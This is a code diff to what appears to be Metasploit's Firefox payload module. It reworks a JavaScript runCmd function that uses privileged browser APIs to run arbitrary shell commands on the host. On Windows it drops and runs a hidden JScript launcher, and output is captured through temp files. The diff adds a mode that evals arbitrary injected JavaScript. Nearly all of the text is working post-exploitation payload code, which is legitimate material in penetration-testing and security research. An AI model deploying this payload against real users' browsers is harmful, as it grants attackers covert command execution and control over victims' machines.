@@ -34,7 +34,7 @@ module Msf::Payload::Firefox
     |
   end
 
-  # Javascript source code of runCmd(str) - runs a shell command on the OS
+  # Javascript source code of runCmd(str,cb) - runs a shell command on the OS
   #
   # Because of a limitation of firefox, we cannot retrieve the shell output
   # so the stdout/err are instead redirected to a temp file, which is read and
@@ -44,20 +44,38 @@ module Msf::Payload::Firefox
   # which redirects stdout.
   #
   # On windows, the command is wrapped in two "cmd /c" calls, the outer of which
-  # redirects stdout. A JScript file "launch" file is then used to run the command
-  # without displaying the command prompt.
+  # redirects stdout. A JScript "launch" file is dropped and invoked with wscript
+  # to run the command without displaying the cmd.exe prompt.
+  #
+  # When the command contains the pattern ",JAVASCRIPT, ... ,ENDSCRIPT,", the
+  # javascript code between the tags is eval'd and returned.
   #
   # @return [String] javascript source code that exposes the runCmd(str) method.
   def run_cmd_source
     %Q|
       var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+      var windows = (ua.indexOf("Windows")>-1);
       var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
-      var runCmd = function(cmd) {
+      var runCmd = function(cmd, cb) {
+        var echo = function(str) {
+          if(!str \|\| !str.length) return '';
+          var e = str.match(/echo ['"]?([^;\\s"']+)/);
+          return (e && e[1]) \|\| '';
+        }
+        var js = (/,JAVASCRIPT,([\\s\\S]*),ENDSCRIPT,/g).exec(cmd.trim());
+        if (js) {
+          var wcmd = (windows) ? cmd+"\\n" : '';
+          var cmds = cmd.split(js[0]).map(function(s){return s.trim().replace(/^\\s*;/, "")});
+          Function('cb', js[1])(function(r) {
+            cb(wcmd+echo(cmds[0])+"\\n"+r+"\\n"+echo(cmds[1]))
+          })
+          return;
+        }
+
         var shEsc = "\\\\$&";
         var shPath = "/bin/sh -c"
-        var windows = (ua.indexOf("Windows")>-1);
 
         if (windows) {
           shPath = "cmd /c";
@@ -78,17 +96,11 @@ module Msf::Payload::Firefox
         }
 
         var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
-        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
 
         var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
           .getService(Components.interfaces.nsIProperties)
           .get("TmpD", Components.interfaces.nsIFile);
         stdout.append(stdoutFile);
-
-        var stderr = Components.classes["@mozilla.org/file/directory_service;1"]
-          .getService(Components.interfaces.nsIProperties)
-          .get("TmpD", Components.interfaces.nsIFile);
-        stderr.append(stderrFile);
 
         if (windows) {
           var shell = shPath+" "+cmd;
@@ -109,13 +121,13 @@ module Msf::Payload::Firefox
           var args = [jscriptFile.path, b64];
           process.run(true, args, args.length);
           jscriptFile.remove(true);
-          return [cmd+"\\r\\n"+readFile(stdout.path), readFile(stderr.path)];
+          cb(cmd+"\\n"+readFile(stdout.path));
         } else {
           sh.initWithPath("/bin/sh");
           process.init(sh);
           var args = ["-c", shell];
           process.run(true, args, args.length);
-          return [readFile(stdout.path), readFile(stderr.path)];
+          cb(readFile(stdout.path));
         }
       };
     |
